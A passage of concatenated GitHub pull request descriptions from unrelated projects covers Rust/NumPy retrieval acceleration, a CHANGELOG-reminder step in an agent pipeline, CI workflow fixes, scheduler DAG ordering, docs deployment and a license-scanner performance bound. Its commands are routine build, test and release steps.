queue a retry from layout/visibility and clear pending state on success or foreign focus. Skip redundant scans when an apply is queued. In the right-sidebar dock, require current first-responder ownership and readiness so visibility alone never steals focus. - **Tests** - Reapply after geometry settles; automatic apply doesn’t bypass deferral; Find “Restore Terminal” preserves it. - Forced reparent reassert queues while tiny and recovers once usable; already-first-responder reparent clear waits for surface geometry. Right-sidebar dock: deferred reapply after geometry and no focus theft on visibility apply. Written for commit 9df36b5b1a8efd6333f946349c3707db58faa1d0. Summary will update on new commits. ## Summary by CodeRabbit * **Bug Fixes** * Improved terminal focus recovery when the focused surface is hidden or shrinks to a tiny size. Suppressed first-responder focus is now deferred and conditionally retried once the view is active/visible and the surface geometry is usable. Pending retries are reliably cleared after unrelated focus handoffs to prevent stale reapplication. * **Tests** * Added a DEBUG-only regression test that verifies deferred suppressed focus is re-applied after resizing the surface back to a usable size.

author: konjoinfinity
body:
## Summary

**Track C1 — commit to Rust, slice 2.** Slice 1 ([#15](https://github.com/konjoai/kohaku/pull/15)) landed a correct bit-packed kernel but measured it **~4× slower than NumPy**, because every batch call marshaled a Python list-of-lists across PyO3. This slice removes that overhead and delivers the real Rust win. Pure-Python stays the correctness baseline (CLAUDE.md). v0.19.0.

### What landed
- **Zero-copy FFI** (`numpy`/`rust-numpy` crate) — `kohaku._kohaku_rs.cosine_topk` now borrows `PyReadonlyArray1/2<i8>` instead of taking `Vec<Vec<i8>>`. No per-element boxing; the one-shot kernel is now ~parity with NumPy instead of ~4× slower.
- **Resident packed index** — `src/accel.rs::PackedIndex` packs keys to one bit per component **once**, so each query marshals only the probe and costs `n·dims/64` XOR+popcount words. Exposed as `kohaku._kohaku_rs.PackedIndex` and wrapped by the public **`kohaku.RetrievalIndex`** (Rust when built; cached `float32` matrix + NumPy otherwise — identical rankings).
- **Automatic acceleration** — `kohaku.query` / `query_with_decay` route through a **per-memory cached index**, invalidated by a monotonic `EpisodicMemory._generation` counter (bumped on every `store`/`clear`). Repeated probes against an unchanged memory skip re-packing.

### Benchmark (`benchmarks/bench_backends.py`, dims=10k, ≥5 warmups, p50)
| N | NumPy p50 | zero-copy one-shot | **resident index** |
|---|---|---|---|
| 1000 | 36 ms | 52 ms (0.7×) | **0.23 ms (~158×)** |
| 5000 | 268 ms | 261 ms (1.0×) | **1.18 ms (~227×)** |

The one-shot path re-packs keys every call, so it's only ~parity with BLAS — which is why **NumPy stays the one-shot default** (making Rust unconditional would regress small-N retrieval; benchmarking gate = >5% p95 hard stop). The decisive win is amortizing the packing via the resident index.

### Verification
- `cargo test` 34 lib + 9 integration; `clippy -D warnings` + `cargo fmt` clean (4 new Rust unit tests for `cosine_topk_rows` / `PackedIndex`)
- Pure-Python suite **524 passed / 4 skipped**; Rust-backend suite **528 passed**
- New `python/tests/test_index.py` — ranking parity vs NumPy, cache reuse/invalidation, weak eviction, dim-mismatch guard
- DRY check **0 violations** at CI thresholds (`--threshold 0.85 --min-lines 20`)

### Notes
- **Wheels are intentionally not published** in this slice (local/CI builds only).
- ⚠️ Heads-up (out of scope, pre-existing): the locally-available `ruff 0.15.x` reformats ~95 files repo-wide (formatter defaults changed since slice 1 merged green) and flags 5 pre-existing lint nits in untouched files. My new/changed files match the merged sibling style and pass `ruff check`. A separate repo-wide `ruff format` sweep + pinning ruff in CI would clear this — happy to do it as its own PR.

author: augusto-romero-arango
body:
## Resumen

Pipeline mefisto-tooling completado:
- Writer: implementacion de la tarea
- Reviewer: revision de calidad

## Decisiones del pipeline

<details>
<summary>Writer -- 4m 8s</summary>

# Stage 1 — Writer — Issue #36

## Objetivo

Que el pipeline interno `/mefisto-tooling` recuerde (como **warning informativo**, no como gate) registrar cada cambio bajo `## [Unreleased]` del `CHANGELOG.md`, para que los cambios no lleguen a `main` con la sección vacía y rompan la fase *prepare* de `/mefisto-release`.

## Cambios realizados

### 1. `.claude/scripts/_mefisto-common.sh` — nueva función `check_unreleased_touched`

Ubicada junto a `validate_mefisto_scope_changes` (misma familia de checks de pipeline).

- Firma: `check_unreleased_touched <worktree_path> <base_commit>`.
- Extrae el cuerpo de la sección `## [Unreleased]` en **dos** versiones del `CHANGELOG.md`:
  - la del commit base (`git show "${base}:CHANGELOG.md"`),
  - la del working tree actual (que incluye `base..HEAD` + cambios sin commitear).
- Reutiliza el **mismo patrón regex** que `extract_unreleased_section` en `mefisto-release.sh`: `(?ms)^##\s*\[Unreleased\][^\n]*\n(.*?)(?=^##\s*\[|\Z)`.
- Considera la sección **tocada** (retorna `0`) solo si el cuerpo actual tiene contenido no vacío **y difiere** del cuerpo base. Esto satisface CA-1: no basta con que `CHANGELOG.md` aparezca en el diff; debe haber contenido nuevo dentro de `[Unreleased]`.
- Degradación segura: si falta `python3` retorna `0` (no se pudo verificar → no emite un recordatorio que sería falso positivo); si no existe `CHANGELOG.md` retorna `1`.
- Documentada explícitamente como **warning, no gate** en su comentario de cabecera.

### 2. `.claude/scripts/mefisto-tooling-pipeline.sh` — invocación

- Nuevo bloque `header "Verificando CHANGELOG [Unreleased]"` colocado **después del Stage 2 reviewer** (tras "Verificar que hay commits") y **antes** de "Sincronizar con main" / creación del PR (CA-2). Se ubica antes del merge con `main` a propósito, para medir el aporte propio del worktree (`base..HEAD`) y no el contenido que `main` pudiera traer.
- Si `check_unreleased_touched` retorna éxito → `success` confirmando que el PR actualiza `[Unreleased]`.
- Si no → tres líneas `warn()` con recordatorio accionable (CA-3) que mencionan añadir una nota bajo `## [Unreleased]`, advierten que `/mefisto-release` aborta con la sección vacía, y aclaran que **el PR se crea igual**. **No aborta** el pipeline (CA-2).

### 3. `CHANGELOG.md` — dogfooding

Añadida una nota bajo `## [Unreleased] > ### Added` describiendo este mismo feature. Así el PR de este issue pasa su propia verificación.

## Alcance (CA-4)

Solo se tocaron archivos del **pipeline interno**: `.claude/scripts/_mefisto-common.sh`, `.claude/scripts/mefisto-tooling-pipeline.sh` y `CHANGELOG.md`. **No** se modificó el `/tooling` publicado ni `validate_consumer_scope_changes` (el consumidor no necesariamente versiona con Keep a Changelog).

## Verificación

- `bash -n` OK en ambos scripts.
- Test manual en repo git temporal cubriendo 4 escenarios:
  1. `CHANGELOG.md` sin tocar → avisa (return 1). ✓
  2. `CHANGELOG.md` en el diff pero el cambio está **fuera** de `[Unreleased]` → avisa (return 1). ✓ (caso clave de CA-1)
  3. Contenido nuevo bajo `[Unreleased]` → no avisa (return 0). ✓
  4. Sin `CHANGELOG.md` → return 1. ✓
- Verificado además contra el `CHANGELOG.md` real de este worktree respecto al commit base: detectado como **tocado**. ✓

## Criterios de aceptación

- [x] CA-1: función `check_unreleased_touched` detecta contenido nuevo dentro de `[Unreleased]`, no la mera aparición de `CHANGELOG.md` en el diff.
- [x] CA-2: el pipeline la invoca tras Stage 2 / antes del PR; emite `warn()` que **no aborta**; el PR se crea igual.
- [x] CA-3: el warning incluye recordatorio accionable.
- [x] CA-4: alcance limitado al pipeline interno.

</details>

<details>
<summary>Reviewer -- 3m 48s</summary>

# Stage 2 -- Reviewer (issue #36)

## Veredicto

**Aprobado sin cambios.** La implementacion del writer es correcta, completa y respeta
las convenciones del repo. No se introdujeron correcciones porque no se encontraron
problemas que las justifiquen (editar codigo correcto solo agrega ruido).

## Cobertura de criterios de aceptacion

- **CA-1 (deteccion de contenido nuevo en `[Unreleased]`)** -- OK.
  `check_unreleased_touched` en `_mefisto-common.sh` compara el cuerpo de la seccion
  `[Unreleased]` del commit base (`git show base:CHANGELOG.md`) contra el del working
  tree y solo la considera "tocada" si el resultado es **no vacio y distinto del base**.
  Reutiliza el mismo regex `(?ms)^##\s*\[Unreleased\][^\n]*\n(.*?)(?=^##\s*\[|\Z)` que
  `extract_unreleased_section` en `mefisto-release.sh` (nota tecnica del issue). No basta
  con que `CHANGELOG.md` aparezca en el diff: un cambio a una seccion versionada con
  `[Unreleased]` intacta NO dispara deteccion (verificado, sin falso positivo).

- **CA-2 (warning, no gate; despues de Stage 2 / antes del PR)** -- OK.
  La invocacion vive en `mefisto-tooling-pipeline.sh` tras el bloque "Verificar que hay
  commits" y **antes de "Sincronizar con main"**. Esta ubicacion es la correcta: corre
  antes del merge con `origin/main`, de modo que el check atribuye a *este* PR solo sus
  propios cambios y no las notas de `[Unreleased]` que pudieran venir del merge. Usa
  `warn()` en la rama negativa; el pipeline continua y el PR se crea igual. Se invoca
  dentro de `if check_unreleased_touched ...; then`, asi que `set -euo pipefail` no aborta
  por su retorno != 0.

- **CA-3 (recordatorio accionable)** -- OK.
  Tres lineas `warn()` que indican que falta la nota, sugieren anadirla bajo
  `## [Unreleased]` y explican el porque (la fase *prepare* de `/mefisto-release` aborta
  con `[Unreleased]` vacia), cerrando con "El PR se crea igual".

- **CA-4 (alcance limitado al pipeline interno)** -- OK.
  El diff solo toca `.claude/scripts/_mefisto-common.sh`, `.claude/scripts/mefisto-tooling-pipeline.sh`
  y `CHANGELOG.md`. No se modifico el `/tooling` publicado ni `validate_consumer_scope_changes`.

## Verificaciones ejecutadas

- `bash -n` en ambos scripts: sin errores de sintaxis.
- `shellcheck -S warning`: los 3 hallazgos (SC2155) son **preexistentes** (`assert_in_mefisto`,
  `log()`); el codigo nuevo no genera ninguno. De hecho `check_unreleased_touched` declara y
  asigna `base_changelog` por separado, evitando exactamente ese SC2155.
- Pruebas funcionales de la funcion:
  - Este PR (base = v0.3.0, `[Unreleased]` quedo poblada) -> detectada (retorno 0). OK.
  - Base = HEAD (sin cambios) -> no detectada (retorno 1, dispara warning). OK.
  - Cambio solo en seccion versionada, `[Unreleased]` intacta -> no detectada (sin falso positivo). OK.
  - Anadir nota a `[Unreleased]` preexistente -> detectada. OK.

## Notas (sin accion requerida)

- El parseo depende de `python3`, que el pipeline ya usa de forma incondicional al leer el
  issue JSON (lineas ~171/177). La funcion ademas degrada a retorno 0 ("no se pudo
  verificar", sin aviso) si faltara `python3`, coherente con su naturaleza informativa.
- Si `CHANGELOG.md` no existiera, la funcion retorna 1 (dispara el recordatorio). Es un caso
  defensivo: en Mefisto el archivo siempre existe, y avisar ante su ausencia es el comportamiento
  util esperado.
- La entrada del `CHANGELOG.md` sigue el estilo del resto (lead-in en negrita, categoria
  `### Added`, referencia al issue), coherente con Keep a Changelog.

</details>

## Commits

95dccaa mefisto-tooling(#36): recordatorio de [Unreleased] al final del pipeline

Closes #36

author: sapk
body:
The env context is not available in the with: inputs of a workflow_call (reusable workflow) call. The build-base / build-agent-base jobs used ${{ env.AGENT_IMAGE_PREFIX }} and ${{ env.MULTICA_BACKEND_IMAGE }} (BACKEND_IMAGE) in that block, which made the workflow file invalid with 'Unrecognized named-value: env' at parse time.

Fix: emit the workflow-level env values from the resolve job as job outputs, then reference them via needs.resolve.outputs.* in the workflow_call with: block. Same pattern that the resolve job already uses for ref / push / multica_tag.

Fixes the staging-build.yml parse error reported in M-38 and the identical bug in docker.yml that would have triggered on the next PR.

body:
## Description
We have several `read_*` apis for different sources like Parquet, Delta, and Iceberg. At the same time, users also use catalog providers like Unity Catalog.

For Unity Catalog in particular, we have a separate function called `read_unity_catalog` which performs catalog authentication and then offloads to the appropriate data format (eg: Parquet). This indirection is a bit confusing, and to pass in arguments for the offloaded function, users have to pass in a dict in `reader_kwargs` where there is no schema, etc defined.

This PR introduces a new `Catalog` contract and a `UnityCatalog` implementation that users can pass into `read_*` functions and authenticate right away.

This also provides basis to move the authentication part from the Dataset construction phase to the execution phase, which will also potentially allow Ray workers to retry upon credential expiration.

```
@PublicAPI(stability="alpha")
class Catalog(ABC):
    """A directory service that resolves a table name to a readable source."""

    @abstractmethod
    def resolve(self, table: str, *, reader: ReaderFormat) -> ResolvedSource:
        """Resolve ``table`` for the given ``reader``."""
        ...
```

author: youf3
body:
## Fix local task rescheduling order and scheduler correctness

### Problem

`LocalTaskManager.check_state()` used a BFS traversal to inspect the
calibration DAG. This had two related bugs:

1. **Dependency ordering violated on reschedule.** When a parent calibration
   was out-of-spec, `check_state()` would still call `run_immediately()` on
   child nodes (because BFS visits children before their parent's out-of-spec
   state was propagated). This meant child calibrations were submitted to the
   scheduler without their prerequisites having completed.

2. **Reversed reschedule priority.** In an all-fail chain (`A → B`, both
   stale), BFS would call `run_immediately(B)` but not `A` — scheduling the
   dependent before the dependency.

Additionally, several correctness issues existed in `AgentScheduler`:

- Mutable default arguments (`parameters=[]`, `checking_param=[]`) caused
  shared state across `Allocation` instances.
- `job_listener` and `missing_job_listener` performed O(n) linear scans
  through allocation lists on every scheduler event.
- `delete_allocation` scanned the entire timeslot array (O(MAX_TIMESLOTS))
  rather than the allocation's own occupied indices.
- Completed remote allocations were pruned from `remote_allocations` in
  `update_schedule()` but their entries were never removed from `_alloc_by_name`,
  causing a memory leak and stale lookups.
- `handle_update_result` would wait indefinitely if an experiment's first
  block had already fired and been pruned from `remote_allocations` before
  the result was requested.
- `handle_cancel` compared `timeslots[index] == exp_id` (allocation object vs.
  string) — always `False` — so cancel never freed timeslots.
- `_get_timeslot_index` used recursion, risking a stack overflow on a heavily
  occupied schedule.
- A global `logging.getLogger().setLevel(logging.DEBUG)` in the module body
  overrode all loggers in the process.

### Solution

**`LocalTaskManager.check_state()` — two-pass algorithm**

Replaced BFS with Kahn topological sort so every parent node is evaluated
before its children. The traversal is split into two passes:

- **Pass 1 (top-down evaluation):** Each node checks its direct predecessors.
  If any predecessor is not `in_spec`, the node inherits `out_of_spec`
  immediately without inspecting its own allocation. This guarantees that a
  failed parent blocks all descendants in a single pass.
- **Pass 2 (frontier reschedule):** A second walk over the same topological
  order reschedules only *frontier* nodes — nodes that are `out_of_spec` but
  whose parents are all `in_spec`. These are the earliest recoverable nodes
  in each chain. Descendants stay blocked until the frontier succeeds.

Root state is now derived from all non-root nodes in topological order, not
just immediate children, so a failure anywhere in the tree is reflected on
root. The `partial_out_of_spec` state is preserved for the mixed case.

**`AgentScheduler` — O(1) lookups and slot tracking**

- Added `_alloc_by_name: dict` and `_alloc_by_job_id: dict` maintained in
  sync with `local_allocations` / `remote_allocations`. `get_allocation()`,
  `job_listener`, and `missing_job_listener` now use O(1) dict lookups.
- Added `_slot_indices: set` on each `Allocation` to track which timeslot
  indices it occupies. `delete_allocation` and timeslot-shift in
  `update_schedule` now operate only on the allocation's own indices.
- `update_schedule` prunes `_alloc_by_name` when completed remote allocations
  are removed.
- `_exp_start_times` tracks when each experiment's first block fires.
  `handle_update_result` uses this to correctly handle results for experiments
  whose blocks have already fired and been pruned from `remote_allocations`.
- `handle_cancel` delegates to `delete_allocation`, which correctly frees
  timeslots, job IDs, and lookup entries.
- `_get_timeslot_index` rewritten as an iterative loop (eliminates recursion).
- Fixed mutable default arguments on `Allocation.__init__`.
- Fixed typo: `Code.FAIELD` → `Code.FAILED`.
- Moved APScheduler log suppression into `AgentScheduler.__init__`; removed
  the global root-logger override.

### Tests

Added `tests/test_local_task_manager_dependency.py` with 7 regression tests
covering the DAG traversal fix:

| Test | Scenario |
|---|---|
| `test_child_checked_when_parent_in_spec` | Happy path — parent OK, child inspected |
| `test_child_not_run_when_parent_out_of_spec` | Stale parent blocks child reschedule |
| `test_child_not_run_when_parent_never_ran` | Unregistered parent blocks child |
| `test_deep_chain_dependency_not_violated` | 3-level chain — grandparent fail blocks all |
| `test_sibling_failure_does_not_block_independent_sibling` | Sibling failures are isolated |
| `test_reschedule_order_respects_dependency_when_all_fail` | All-fail: parent rescheduled before child |
| `test_reschedule_order_with_no_allocations_respects_dependency` | All-None: only frontier (one call) rescheduled |

author: cvvt
body:
This PR adds a Linux userland runner for the Windows shim so that we can ensure that Windows shim is host agnostic. This is especially important for coding agents because they keep using host APIs to cut corners. With more comprehensive tests, I believe less human intervention is needed.

To run the hello-world program from powershell

```
wsl.exe bash -lc 'cd /mnt/c/Users/weitengchen/work/litebox && LITEBOX_LOG=debug cargo run -q -p litebox_runner_windows_on_linux_userland -- --initial-files /mnt/c/Users/weitengchen/work/litebox/target/tmp/no_import.tar /no_import.exe'
```

Both the tar and PE files are generated by the test `loads_minimal_pe_without_imports` running on Windows.

author: remrama
body:
Refines the docs deploy model from #260: the live site now tracks **stable releases only**, and the PDF manual is attached to **every** release in one consistent way.

## Behavior
- **Live site (HTML) → Pages: stable only.** `docs.yml` renders + checks on every PR/push (breakage still caught early), but publishes to GitHub Pages only on a stable `vX.Y.Z` tag (no pre-release suffix). The site never reflects a dev or pre-release build.
- **PDF → every release.** One `build-pdf` job (renamed from `manual-pdf`) renders the Typst PDF and attaches `SMACC-manual.pdf` to whatever release the run publishes — a tagged release (stable/pre-release) or the rolling `dev` pre-release on a main push — via `gh release upload --clobber` (asset-only; never touches the release's metadata, which `build-exe` owns). Old and dev manuals stay retrievable from their release assets.
- **Built-in Download PDF button kept.** `book: downloads: [pdf]` surfaces Quarto's sidebar "Download PDF" control (serving the site-hosted stable copy); the manual in-page PDF link on the home page is removed since the button covers it.
- Asset renamed to `SMACC-manual.pdf` (matches `SMACC-Setup.exe` / `SMACC-dev.zip`).

## Notes
- Docs-only merges to `main` (paths-ignored from `release.yml`) don't republish the dev manual — it refreshes with the next dev build (a code change) — and the live site only changes on a stable release. By design.
- Pages source must stay "GitHub Actions" (set during #260).

Verified locally: `quarto render docs` produces `SMACC-manual.pdf` and the Download PDF button; `check_links` + `check_manual` pass; `mdformat` / `ruff` / docs-schema tests pass.

author: mstykow
body:
## Summary

- Fixes a ~7x license-detection performance regression on repositories that contain large generated data files or lockfiles (root case: astral-sh/uv).
- Root cause: the difflib-derived approximate **sequence matcher** runs over a single very large query run and degrades toward O(n^2). uv's 2.6 MB `crates/uv-python/download-metadata.json` tokenizes to one ~232k-token query run; a few "legalese" tokens (`gnu`, `variant`, `releases`) recur thousands of times, so `find_longest_match`'s divide-and-conquer cannot make large splits, and this is repeated per candidate rule. The cost grew sharply as the embedded rule set expanded between April and June (more candidate rules share those common tokens), turning a ~6s file into a ~43s file.
- Fix: skip only the *approximate* sequence matcher for query runs above a generous `MAX_SEQ_QUERY_RUN_TOKENS` (50,000) ceiling. Such a run cannot be a license — the largest license text in the index is under 15k tokens and the largest genuine query runs across real source/license files stay under ~22k tokens. Exact matching (hash, SPDX-LID, Aho-Corasick) is unaffected, so verbatim and near-verbatim licenses embedded in large files are still detected.
- This is a general scanner bound, not a uv-specific hack.

### Culprit and mechanism

- **Where:** `provenant::license_detection::seq_match::matching::seq_match_with_candidates_and_deadline` (`find_longest_match_impl` at `matching.rs`), driven from `collect_regular_seq_matches` and the whole-run near-dupe pass in `src/license_detection/mod.rs`.
- **Why now:** the matcher and query-run/candidate-selection logic are byte-for-byte equivalent between the April base (`231eae15`) and June `main`; the difference is the embedded rule data ("update license rules to latest" + overlay additions). More rules now share the JSON's ultra-frequent legalese tokens, so far more candidates survive the high-token gate and each is sequence-matched over the same ~232k-token run.
- **Evidence:** profiling the warm `-l` scan attributed ~50%+ self time to `seq_match_with_candidates_and_deadline` (plus SipHash churn inside it). Instrumentation showed the JSON produces a single query run of **232,359 tokens** with 14 regular candidates.

## Issues

- Covers: ~7x license-detection regression scanning astral-sh/uv between `231eae15` (April) and `main` (June), localized to license detection on `download-metadata.json`.

## Scope and exclusions

- Included: per-query-run token-count ceiling guarding both sequence-matching entry points (regular per-run pass and the near-dupe whole-run pass); a unit test pinning the contract.
- Explicit exclusions: no change to the sequence-matching algorithm itself (it stays faithful to ScanCode/difflib), no change to exact matchers, no rule/overlay edits, no embedded-index regeneration.

## How to verify

Beyond the CI golden/unit suites, the load-bearing evidence is the `perf-ab` self-comparison (base `231eae15` vs this branch), measured on Apple M5 Pro:

- Isolated regressing file (`/tmp/uv-json/download-metadata.json`), `-l --strip-root -n 1`, 5 rounds:
  - base median **5.82s**, this branch median **4.49s** (1.30x faster than base; vs ~43.4s on regressed `main` — about 9.7x faster than `main`).
  - `cargo run --manifest-path xtask/Cargo.toml --bin perf-ab -- --base 231eae15053a14a37f418df4bb26c0c89d95ddb7 --head <this-branch> --target-path <dir-with-download-metadata.json> --rounds 5 -- -l --strip-root -n 1`
- Full uv repo, `--profile common` (`-clupe --system-package --strip-root --processes 4`), 5 rounds:
  - base median **11.55s**, this branch median **8.86s** (1.30x faster than base; vs ~46s on regressed `main`).
  - `cargo run --manifest-path xtask/Cargo.toml --bin perf-ab -- --base 231eae15053a14a37f418df4bb26c0c89d95ddb7 --head <this-branch> --repo-url https://github.com/astral-sh/uv.git --repo-ref 9581f2b0ea65550a3efe28bd7aabde19d98b39ba --profile common --rounds 5`

Detection quality: `cargo test --test license_detection_golden --features golden-tests` passes unchanged (all data-driven fixtures, zero detection-quality regressions). The new unit test `test_oversized_low_signal_run_skips_sequence_matching_but_keeps_exact` confirms a >50k-token low-signal run stays bounded while a verbatim MIT license embedded in it is still detected via exact matching.

## Intentional differences from Python

- ScanCode's `seq.py` has no popular-token/large-run guard; it relies on its Cython matcher and the `match_set.py` candidate gate. Provenant adds a bounded large-run guard so a single pathological run cannot dominate a scan. This only suppresses fuzzy alignment on runs far larger than any license; exact detection is unchanged, so it is a safety/boundedness improvement rather than a parity loss.

## Expected-output fixture changes

- Files changed: none. No golden YAML or `.expected` fixtures changed; the license golden suite passes as-is.
